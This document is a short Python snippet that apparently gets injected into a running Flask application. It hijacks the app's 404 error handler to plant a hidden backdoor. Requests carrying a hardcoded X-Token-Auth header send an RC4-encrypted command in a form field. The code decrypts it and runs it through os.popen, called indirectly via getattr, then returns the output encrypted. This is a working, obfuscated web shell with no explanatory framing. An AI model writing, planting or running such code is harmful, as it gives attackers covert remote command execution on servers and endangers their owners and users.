global exc_class
global code
import os,binascii
exc_class, code = app._get_exc_class_and_code(404)
RC4_SECRET = b'v1p3r_5tr1k3_k3y'
def rc4_crypt(data: bytes, key: bytes) -> bytes:
	S = list(range(256))
	j = 0
	for i in range(256):
		j = (j + S[i] + key[i % len(key)]) % 256
		S[i], S[j] = S[j], S[i]
	i = j = 0
	res = bytearray()
	for char in data:
		i = (i + 1) % 256
		j = (j + S[i]) % 256
		S[i], S[j] = S[j], S[i]
		res.append(char ^ S[(S[i] + S[j]) % 256])
	return bytes(res)
def backdoor_handler():
	if request.headers.get('X-Token-Auth') != '3011aa21232beb7504432bfa90d32779':
		return "Error"
	enc_hex_cmd = request.form.get('data')
	if not enc_hex_cmd:
		return ""
	try:
		enc_cmd = binascii.unhexlify(enc_hex_cmd)
		cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode('utf-8', errors='ignore')
		output_bytes = getattr(os, 'popen')(cmd).read().encode('utf-8', errors='ignore')
		enc_output = rc4_crypt(output_bytes, RC4_SECRET)
		return binascii.hexlify(enc_output).decode()
	except:
		return "Error"
app.error_handler_spec[None][code][exc_class]=lambda error: backdoor_handler()